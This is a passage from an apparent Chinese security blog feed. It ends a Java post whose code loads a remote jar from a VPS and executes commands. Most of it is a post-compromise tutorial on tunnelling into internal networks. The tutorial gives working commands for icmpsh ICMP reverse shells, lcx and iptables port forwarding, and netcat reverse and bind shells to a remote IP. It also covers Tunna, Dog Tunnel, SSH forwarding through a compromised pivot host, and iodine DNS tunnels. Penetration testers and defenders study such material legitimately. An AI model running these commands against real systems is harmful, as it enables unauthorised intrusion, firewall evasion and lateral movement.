</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 定义远程加载的jar路径</span><br>            URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;vps/cmd.jar&quot;</span>);<br><br>            <span class="hljs-comment">// 创建URLClassLoader对象，并加载远程jar包</span><br>            URLClassLoader ucl = <span class="hljs-keyword">new</span> URLClassLoader(<span class="hljs-keyword">new</span> URL[]&#123;url&#125;);<br><br>            <span class="hljs-comment">// 定义需要执行的系统命令</span><br>            String cmd = <span class="hljs-string">&quot;ls&quot;</span>;<br><br>            <span class="hljs-comment">// 通过URLClassLoader加载远程jar包中的CMD类</span><br>            Class cmdClass = ucl.loadClass(<span class="hljs-string">&quot;CMD&quot;</span>);<br><br>            <span class="hljs-comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span><br>            Process process = (Process) cmdClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(<span class="hljs-keyword">null</span>, cmd);<br><br>            <span class="hljs-comment">// 获取命令执行结果的输入流</span><br>            InputStream           in   = process.getInputStream();<br>            ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>            <span class="hljs-keyword">byte</span>[]                b    = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">int</span>                   a    = -<span class="hljs-number">1</span>;<br><br>            <span class="hljs-comment">// 读取命令执行结果</span><br>            <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>                baos.write(b, <span class="hljs-number">0</span>, a);<br>            &#125;<br><br>            <span class="hljs-comment">// 输出命令执行结果</span><br>            System.out.println(baos.toString());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译为jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CMD</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Process <span class="hljs-title">exec</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">return</span> Runtime.getRuntime().exec(cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>构建通道漫游内网</title>
    <link href="/2022/02/19/%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93%E6%BC%AB%E6%B8%B8%E5%86%85%E7%BD%91/"/>
    <url>/2022/02/19/%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93%E6%BC%AB%E6%B8%B8%E5%86%85%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h1 id="构建通道漫游内网"><a href="#构建通道漫游内网" class="headerlink" title="构建通道漫游内网"></a>构建通道漫游内网</h1><h2 id="判断内网连通性"><a href="#判断内网连通性" class="headerlink" title="判断内网连通性"></a>判断内网连通性</h2><p>测试机器能否上网</p><ul><li>ICMP</li></ul><p><code>ping baidu.com</code></p><ul><li>HTTP</li></ul><p><code>curl baidu.com</code></p><ul><li>DNS</li></ul><p><code>nslookup baidu.com 114.114.114.114</code> //指定dns解析域名</p><p><code>dig @8.8.8.8 baidu.com</code></p><p>仅DNS出网可以直接CS-DNS上线</p><ul><li>TCP</li></ul><p><code>nc</code></p><blockquote><p>nc -lvvp 2333</p><p>nc -zv ip port //扫描时不发送任何数据，用于扫描</p><p>nc -nv ip port //不加n参数一样，会构建TCP/UDP连接读写数据</p></blockquote><ul><li>proxy</li></ul><p>流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段</p><p>判断：</p><ol><li>查看网络连接 netstat</li><li>查看内网是否有主机名类似于<code>proxy</code>的机器</li><li>本地一些软件的代理设置</li><li>pac文件</li><li>通过curl命令确认</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl baidu.com <span class="hljs-regexp">//</span>不通<br>curl -x proxy_ip baidu.com <span class="hljs-regexp">//</span>通<br>proxychains<br></code></pre></td></tr></table></figure><ul><li>读取本机代理</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">REG QUERY <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><span class="hljs-comment">#查看代理配置情况,连接它的代理试试</span><br></code></pre></td></tr></table></figure><ul><li>是否存在Nginx反向代理</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#1、找到Nginx目录</span><br><span class="hljs-comment">#2、查看配置文件</span><br><span class="hljs-comment">#3、例如某次实战中发现正反向都代理不出去，查看配置文件发现了nginx反代，直接连接公网IP代理的3389端口</span><br></code></pre></td></tr></table></figure><h2 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h2><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><h4 id="ipv6"><a href="#ipv6" class="headerlink" title="ipv6"></a>ipv6</h4><p>socat、6tunnel、nt6tunnel</p><h4 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h4><p><img src="https://img-blog.csdnimg.cn/20201203132129490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" alt="img"></p><p>ICMP协议用于检测网络连通状态，不依赖于端口开放，而防火墙通常会开放此协议。于是在上层隧道http，dns等均不可建立时，可以ping远程访问计算机，尝试建立icmp隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿透防火墙</p><h5 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a><a href="https://github.com/inquisb/icmpsh">icmpsh</a></h5><p>跨平台，运行无需管理员权限，但会报毒</p><blockquote><p>icmpsh需要代替系统ping的应答程序，需要关闭系统的，保证shell的稳定</p><p>sysctl -w net.ipv4.icmp_echo_ignore_all=1</p></blockquote><p>可能存在的安装问题：以kali为例</p><p>运行：</p><blockquote><p>./run.sh</p></blockquote><p>提示安装impacket库，这里是python2运行的，因此需要pip2去安装</p><blockquote><p>安装pip2</p><p>wget <a href="https://bootstrap.pypa.io/pip/2.7/get-pip.py">https://bootstrap.pypa.io/pip/2.7/get-pip.py</a></p></blockquote><p>安装pip2后安装库可能出现报错<code>egg_info</code>，则需要更新<code>setuptools</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220228225530950.png"></p><p>这边运行./run.sh会报错，查看sh发现是</p><blockquote><p>python icmpsh_m.py “$IP” “VICTIM”</p></blockquote><p>于是kali</p><blockquote><p>python icmpsh_m.py 192.168.254.128 192.168.254.133</p></blockquote><p>目标</p><blockquote><p>icmpsh.exe -t 192.168.254.128</p><p>icmpsh.exe -t 192.168.254.128 -d 500 -b 30 -s 128 //500请求延迟(心跳)，断开shell前的最大数30，缓冲区数128</p></blockquote><p>具体参数：</p><blockquote><p>icmpsh.exe [options] -t target<br>options:<br>  -t host            host ip address to send ping requests to<br>  -r                 send a single test icmp request and then quit<br>  -d milliseconds    delay between requests in milliseconds (default is 200)<br>  -o milliseconds    timeout in milliseconds<br>  -h                 this screen<br>  -b num             maximal number of blanks (unanswered icmp requests) before quitting<br>  -s bytes           maximal data buffer size in bytes (default is 64 bytes)</p><p>In order to improve the speed, lower the delay (-d) between requests or increase the size (-s) of the data buffer</p></blockquote><p>如果环境中无python环境，则可以利用源码编译可执行文件</p><blockquote><p>gcc icmpsh-m.c -o icmpsh</p><p>./icmpsh 192.168.254.128 192.168.254.133</p></blockquote><p>icmp隧道分析<a href="https://zhuanlan.zhihu.com/p/113692119">https://zhuanlan.zhihu.com/p/113692119</a></p><p>普通的ping请求：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301144255789.png"></p><p>4个带有32字节数据的数据包</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">0000  <span class="hljs-number"> 48 </span>7d 2e f5 f2<span class="hljs-number"> 53 </span>34 7d f6 7b 2d<span class="hljs-number"> 11 </span>08<span class="hljs-number"> 00 </span>45<span class="hljs-number"> 00 </span>  H&#125;...S4&#125;.&#123;-...E.<br>0010  <span class="hljs-number"> 00 </span>3c 0a<span class="hljs-number"> 23 </span>00<span class="hljs-number"> 00 </span>80<span class="hljs-number"> 01 </span>00<span class="hljs-number"> 00 </span>c0 a8<span class="hljs-number"> 01 </span>68<span class="hljs-number"> 31 </span>e9   .&lt;.<span class="hljs-comment">#.........h1.</span><br>0020  <span class="hljs-number"> 22 </span>43<span class="hljs-number"> 08 </span>00<span class="hljs-number"> 31 </span>19<span class="hljs-number"> 00 </span>01 1c<span class="hljs-number"> 42 </span>61<span class="hljs-number"> 62 </span>63<span class="hljs-number"> 64 </span>65<span class="hljs-number"> 66 </span>  &quot;C..1....Babcdef<br>0030  <span class="hljs-number"> 67 </span>68<span class="hljs-number"> 69 </span>6a 6b 6c 6d 6e 6f<span class="hljs-number"> 70 </span>71<span class="hljs-number"> 72 </span>73<span class="hljs-number"> 74 </span>75<span class="hljs-number"> 76 </span>  ghijklmnopqrstuv<br>0040  <span class="hljs-number"> 77 </span>61<span class="hljs-number"> 62 </span>63<span class="hljs-number"> 64 </span>65<span class="hljs-number"> 66 </span>67<span class="hljs-number"> 68 </span>69                     wabcdefghi<br></code></pre></td></tr></table></figure><p>icmp隧道搭建的shell执行了命令则会产出大量流量，主要包含icmp请求和回复</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301145815977.png"></p><p>重点可以看一下</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301150845044.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301150608667.png"></p><p>获取到shell以及执行了whoami命令产生的数据包高达106字节，因此在溯源时可以从：</p><ul><li>单位时间的icmp数据包数量</li><li>数据包大小</li><li>数据包内容</li></ul><h5 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a><a href="https://github.com/jamesbarlow/icmptunnel">icmptunnel</a></h5><h5 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="PingTunnel"></a><a href="https://github.com/esrrhs/pingtunnel/releases">PingTunnel</a></h5><h5 id="powershell-icmp"><a href="#powershell-icmp" class="headerlink" title="powershell icmp"></a>powershell icmp</h5><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><h5 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h5><p>win  lcx.exe</p><p>linux lcx/portmap</p><ul><li>内网端口转发</li></ul><p>在目标机器上执行，将目标机器的指定端口(22)转发到公网 vps 指定端口上(80)</p><blockquote><p>./lcx -slave vps port 127.0.0.1 22</p></blockquote><p>在公网机器上监听80并转发到本机443端口上</p><blockquote><p>lcx.exe -listen 80 443<br>./portmap -m 2 -p1 80 -p2 443</p></blockquote><p>此时，攻击者用 ssh  公网IP+443 即可登陆目标服务器22</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/lcx.gif"></p><p>lcx时间比较长了，找不到来源，可以参考<a href="https://github.com/yw9381/lcx">https://github.com/yw9381/lcx</a></p><ul><li>本地端口映射，不直接访问22，但可以访问80(常用于绕过防火墙)</li></ul><blockquote><p>lcx -tran 80 127.0.0.1 22</p></blockquote><p>//备注：buu linux靶机修改其web服务端口为8080(外网不可直接访问)，然后做一个端口映射</p><blockquote><p> vim /etc/apache2/ports.conf</p><p>service apache2 restart</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/lcx2.gif"></p><h5 id="iptables-linux"><a href="#iptables-linux" class="headerlink" title="iptables(linux)"></a>iptables(linux)</h5><p>1、编辑配置文件</p><blockquote><p>vi /etc/sysctl.conf<br>net.ipv4.ip_forward = 1 #开启IP转发</p></blockquote><p>2、关闭服务</p><blockquote><p>service iptables stop</p></blockquote><p>3、配置规则</p><blockquote><p>#需要访问的内网地址：10.1.1.11（Windows）<br>#内网边界web服务器：192.168.100.100（Linux）<br>iptables -t nat -A PREROUTING –dst 192.168.100.100 -p tcp –dport 3389 -j DNAT–to-destination 10.1.1.11:3389</p><p>iptables -t nat -A POSTROUTING –dst 10.1.1.11 -p tcp –dport 3389 -j SNAT –to-source 192.168.100.100</p></blockquote><p>4、保存并重启服务</p><blockquote><p> service iptables save &amp;&amp; service iptables start</p></blockquote><p>这时访问Web服务器的3389就能登录到内网机器的桌面了。</p><h5 id="netsh-win"><a href="#netsh-win" class="headerlink" title="netsh(win)"></a>netsh(win)</h5><p>仅支持TCP协议，适用于<strong>双网卡</strong>服务器</p><blockquote><p>netsh interface portproxy show all //查看现有规则</p><p>netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=1234 connectaddress=内网IP connectport=3389 //添加转发规则，set改delete取消转发</p><p>netsh interface ipv6 install //xp下安装ipv6</p></blockquote><h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><h5 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"> nc -h<br>[v1.11 NT www.vulnwatch.org/netcat/]<br>connect to somewhere:   nc [-options] hostname port[s] [ports] ...<br>listen for inbound:     nc -l -p port [options] [hostname] [port]<br>options:<br>        -d              detach from console, background mode<br>        -e prog         inbound program to exec [dangerous!!]<br>        -g gateway      source-routing hop point[s], up to 8<br>        -G num          source-routing pointer: 4, 8, 12, ...<br>        -h              this cruft<br>        -i secs         delay interval for lines sent, ports scanned<br>        -l              listen mode, for inbound connects<br>        -L              listen harder, re-listen on socket close<br>        -n              numeric-only IP addresses, no DNS<br>        -o file         hex dump of traffic<br>        -p port         local port number<br>        -r              randomize local and remote ports<br>        -s addr         local source address<br>        -t              answer TELNET negotiation<br>        -u              UDP mode<br>        -v              verbose [use twice to be more verbose]<br>        -w secs         timeout for connects and final net reads<br>        -z              zero-I/O mode [used for scanning]<br>port numbers can be individual or ranges: m-n [inclusive]<br></code></pre></td></tr></table></figure><p>来，英语不好的达瓦里氏，给你们翻译翻译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -l -p port [options] [hostname] [port]<br><br>-d 后台模式<br>-e prog 程序重定向，一旦连接，就执行 [危险!!]<br>-g &lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个<br>-G &lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数<br>-h 帮助信息<br>-i secs 延时的间隔<br>-l 监听模式，用于入站连接<br>-L 连接关闭后,仍然继续监听<br>-n 指定数字的IP地址，不能用hostname<br>-o file 记录16进制的传输<br>-p port 本地端口号<br>-r 随机本地及远程端口<br>-s addr 本地源地址<br>-t 使用TELNET交互方式<br>-u UDP模式<br>-v 详细输出--用两个-v可得到更详细的内容<br>-w secs timeout的时间<br>-z 将输入输出关掉--用于扫描时<br><br>端口的表示方法可写为M-N的范围格式<br></code></pre></td></tr></table></figure><p><code>反向连接</code>：目标绑定shell并发起连接，vps监听</p><blockquote><p>vps：nc -lvvp 2333</p><p>target：nc -t -e cmd RemoteIP 2333 //cmd重定向到目标ip，即弹shell，也可以用powershell</p></blockquote><p><code>正向连接</code>：目标绑定shell并监听等待连接，vps发起连接</p><p><strong>情形往往是目标不出网</strong></p><blockquote><p>target：nc -lvvp 2333 -e cmd</p><p>nc -nvv targetIP 2333</p></blockquote><p>大白话就是：不管怎样，都是先监听后建立连接，区别在于谁在监听</p><h5 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h5><p>nc的powershell版本<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><h5 id="Tunna"><a href="#Tunna" class="headerlink" title="Tunna"></a><a href="https://github.com/SECFORCE/Tunna">Tunna</a></h5><p>有点像reGeorg的方式，但这是通过HTTP包装的TCP隧道工具，同样需要上传脚本</p><p>然后攻击机器：</p><blockquote><p>python proxy.py -u <a href="http://xxx/conn.php">http://xxx/conn.php</a> -l 4444 -r 3389 -v</p></blockquote><p>现在即可通过本地4444访问到远端3389</p><h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><h5 id="udp2raw"><a href="#udp2raw" class="headerlink" title="udp2raw"></a><a href="https://github.com/wangyu-/udp2raw">udp2raw</a></h5><h4 id="KCP"><a href="#KCP" class="headerlink" title="KCP"></a>KCP</h4><p><a href="https://zhuanlan.zhihu.com/p/112442341">kcp</a>TCP和UDP的折中方案</p><h5 id="Dog-Tunnel"><a href="#Dog-Tunnel" class="headerlink" title="Dog Tunnel"></a><a href="https://github.com/vzex/dog-tunnel">Dog Tunnel</a></h5><p>又名狗洞，使用方法</p><p><a href="https://hatboy.github.io/2018/08/28/%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%8F%8A%E7%A9%BF%E9%80%8F/2.png"><img src="https://inotgo.com/imagesLocal/202111/08/20211108204253211w_0.png.jpg"></a></p><ul><li><p>dtunnel_s 为服务端 dtunnel 为客户端。远端是最终要连接的端口，通常是内网服务器，近端是本地需要连接的端口，通常是本地。</p></li><li><p>dtunnel_s  启动时会监听一个tcp端口，通过-addr设置，如果需要-ssl(默认是false)，那么要指定-cert加载ssl证书，之后客户端连接也要打开-ssl开关(默认是true的) -addrudp 是p2p打洞的辅助udp端口，能提高打洞成功率,对应dtunnel参数-buster指定同样的ip和端口</p></li><li><p>dtunnel_s 支持远程接口管理，如果需要，可通过-admin 指定ip:端口，比如-admin 127.0.0.1:1234</p></li><li><p>使用方法：</p><ol><li>首先在公网服务器上面启动服务，监听端口：</li></ol><blockquote><p>dtunnel_s -addr 0.0.0.0:8888 -ssl=false</p></blockquote></li><li><p>服务端参数说明：</p><ul><li>-addr：服务端地址，默认是：0.0.0.0:8000</li><li>-addrudp：UDP服务端地址，用于P2P辅助打洞，默认是：0.0.0.0:8018</li><li>-admin：管理接口，用于提供API方便管理，如：0.0.0.0:1234</li><li>-ssl：启用ssl支持，启用需要指定-cert和-cert参数，默认关闭，有bug，必须加上-ssl=false来关闭ssl</li><li>-https：启用管理接口的HTTPS支持，需要指定-cert和-cert参数，默认关闭</li><li>-cert：证书路径</li><li>-key：证书密钥路径</li><li>-dbhost：数据库服务器</li><li>-dbpass：数据库密码</li><li>-dbuser：数据库用户</li><li>-replace：如果客户端注册名冲突，踢掉之前的，默认关闭</li><li>-version：显示版本</li></ul><ol start="2"><li>远端客户端连接服务端：</li></ol><blockquote><p>dtunnel -buster 1.2.3.4:8018 -remote 1.2.3.4:8888 -mode 0 -reg redis -local :6379 -addip 127.0.0.1 -clientkey password -ssl=false</p><p>如果需要开启SOCKS5服务，修改-local参数即可，近端无需修改</p><p>dtunnel -buster 1.2.3.4:8018 -remote 1.2.3.4:8888 -mode 0 -reg redis -local socks5 -addip 127.0.0.1 -clientkey password -ssl=false</p></blockquote><ol start="3"><li>近端客户端连接客户端：</li></ol><blockquote><p>dtunnel -buster 1.2.3.4:8018 -remote 1.2.3.4:8888 -mode 0 -link redis -local :9999 -addip 127.0.0.1 -clientkey password -ssl=false -encrypt</p></blockquote></li><li><p>客户端参数说明：</p><ul><li><p>-addip：出口IP(单个或列表)，注意:对于多公网ip的终端，请用-stun参数指定stun服务器辅助连接，或者用-addip参数手工指定出口ip列表，默认是：127.0.0.1</p></li><li><p>-remote：远程服务器，用于C/S模式，对应服务端-addr地址端口</p></li><li><p>-buster：打洞服务器，用于P2P模式，对应服务端-addrudp端口地址</p></li><li><p>-clientkey：客户端Key，用于远端和近端认证，需一致</p></li><li><p>-reg：注册名，远端使用</p></li><li><p>-link：连接的注册名，近端使用，用于识别连接远端</p></li><li><p>-local：本地监听端口，填socks5则为socks5代理服务</p></li><li><p>-encrypt：P2P模式加密，近端才能使用</p></li><li><p>-mode：连接模式(0:P2P打洞失败后切换为C/S 1:只使用P2P 2:只使用C/S)</p></li><li><p>-compress：压缩数据，远端和近端需一致</p></li><li><p>-debug：调试模式</p></li><li><p>-delay：打洞失败后重试延迟，秒</p></li><li><p>-dnscache：DNS缓存有效期，如果大于0将定时清空DNS缓存，分钟</p></li><li><p>-f：从文件中加载配置</p></li><li><p>-kcp：kcp配置，远端和近端需一致</p></li><li><p>-key：访问Key(服务端数据库中的AuthKey)</p></li><li><p>-pipen：管道数</p></li><li><p>ds：数据纠错？仅在P2P模式有效，远端和近端需一致</p></li><li><p>-ps：奇偶校验？仅在P2P模式有效，远端和近端需一致</p></li><li><p>-ssl：启用ssl支持，默认启用，服务端没有启用的话请使用-ssl=false来关闭，有bug，必须加上-ssl=false来关闭ssl</p></li><li><p>-v：输出详细日志</p></li><li><p>-version：显示版本</p></li></ul><ol start="4"><li>访问：访问近端（本地）9999端口即可连接到远端6379端口。或者通过本地9999端口连接SOCKS5服务器： </li></ol><blockquote><p>nc 127.0.0.1 9999</p><p>或者</p><p>curl ip.cn -x socks5://127.0.0.1:9999</p></blockquote></li></ul><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>应用层位于TCP/IP协议的最顶层，通常用于搭建各种应用服务，而基于应用层搭建的隧道技术就是利用各种应用所占用的端口进行搭建，比如有SSH、HTTP/HTTPS和DNS服务，这些服务是服务器经常用到不会被禁止的协议。</p><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><p>SSH是英文Secure Shell的简写形式,SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登陆会话和其他网络服务提供安全性的协议。ftp、pop和telnet在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的安全认证方式也是有其弱点的， 就是很容易受到“中间人”攻击，SSH目前包括 SSH1和SSH2两个版本，是目前最常用的安全通讯协议。通常情况下，ssh协议是允许通过防火墙和边界设备。</p><p>尤其是取得高权限shell时屡试不爽</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh<br>usage: ssh [?] [-b bind_address] [-c cipher_spec]<br>           [-D [bind_address:]port] [-E log_file] [-e escape_char]<br>           [-F configfile] [-I pkcs11] [-i identity_file]<br>           [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec]<br>           [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address]<br>           [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]<br>           [user@]hostname [command]<br>//-f:后台认证用户/密码，通常和-N连用，不用登录到远程主机;-N:不执行脚本或命令，通常与-f连用<br>//-C:压缩传输数据;-g:允许远程主机连接本机的转发端口...还有其他说法的...<br></code></pre></td></tr></table></figure><h5 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h5><p>A是攻击者，B和C在一个内网，A可以访问B(B具有公网IP)，但不可以访问C</p><p><strong>A上执行：</strong></p><blockquote><p>ssh -CfNg -L A监听端口 : C内网IP : 目标端口  root@B          -f转入后台 -N建立静默连接，两参数常配合使用</p></blockquote><blockquote><p> ssh -CfNg -L 1234:192.168.254.155:3389 <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#50;&#53;&#52;&#x2e;&#x31;&#x33;&#x30;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#50;&#53;&#52;&#x2e;&#x31;&#x33;&#x30;</a></p></blockquote><p>可能会一时难以理解，在本地(ssh.exe所在机器)监听一个端口，所有访问这个端口的流量都会通过SSH隧道传输到远端的对应端口，ssh本地转发也是正向的。</p><p>A-128，B-130，C-155</p><p>假如b=c，则是本地转发的特例，端口转发</p><h5 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h5><p>A是攻击者的VPS，攻陷B，B和C同一内网没有公网IP</p><p><strong>跳板B上执行：</strong></p><blockquote><p>ssh -CfNg -R A端口 :  C内网IP : C目标端口 root@A</p></blockquote><blockquote><p>ssh -CfNg -R 10086:192.168.254.155:3389 <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x32;&#53;&#x34;&#46;&#x31;&#x32;&#x38;">&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x32;&#53;&#x34;&#46;&#x31;&#x32;&#x38;</a></p></blockquote><p>然后在VPS上就可以访问C3389，这是反向的</p><p>假如b=c，则是内网穿透的反向代理</p><p>理解不清楚的参考：<a href="https://zhuanlan.zhihu.com/p/170597122">https://zhuanlan.zhihu.com/p/170597122</a></p><h5 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h5><p>你的Linux A，以及一台海外服务器B，ssh动态转发建立socks4/5后可用于翻墙</p><blockquote><p>ssh -qTfnN -D 端口 root@B </p></blockquote><p>然后使用proxychains使用该socks隧道即可</p><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><p>首先查看内部域名及ip地址</p><blockquote><p>cat /etc/resolv.conf | grep -v “#”</p></blockquote><p>查看是否与内部DNS通信解析外部域名</p><blockquote><p>nslookup baidu.com</p></blockquote><p>可以参考文章搭建：</p><p><a href="https://www.secpulse.com/archives/144987.html">https://www.secpulse.com/archives/144987.html</a></p><p>工具推荐：</p><p>dnscat2(win可以用dnscat2-powershell)、iodine</p><ul><li>部署域名解析</li></ul><p>先添加A类解析，然后创建NS解析</p><p>主机记录：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220531212729475.png"></p><p>解析类型：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220531212853728.png"></p><ul><li>联通测试，VPS抓包</li></ul><blockquote><p>tcpdump -n -i eth0 udp port 53</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220528202309017.png"></p><h5 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a><a href="https://github.com/yarrick/iodine">iodine</a></h5><p>服务端如上检查NS解析正常后：</p><blockquote><p>iodined -fP password 10.0.0.1 ns1.xxx.xxx //服务器会生成一个10.0.0.1的dns0接口</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220531221801850.png"></p><p>客户端：</p><blockquote><p>iodine -fP password [vps-ip] ns1.xxx.xxx //不能访问外网ip时，可以不加vps-ip</p></blockquote><p>如果出现报错</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220531213841946.png"></p><p>服务端加上<code>-c</code>参数<code>to disable check of client IP/port on each request</code></p><p>然后查看目标机器生成的dns0接口</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220531221921570.png"></p><p>在vps使用：</p><blockquote><p>ssh <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x30;&#46;&#48;&#46;&#48;&#x2e;&#50;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x30;&#46;&#48;&#46;&#48;&#x2e;&#50;</a></p></blockquote><p>一些比较糟糕的情况(中继模式)，使用<code>-I1</code>、<code>-L0</code>、<code>-m</code>、<code>-M 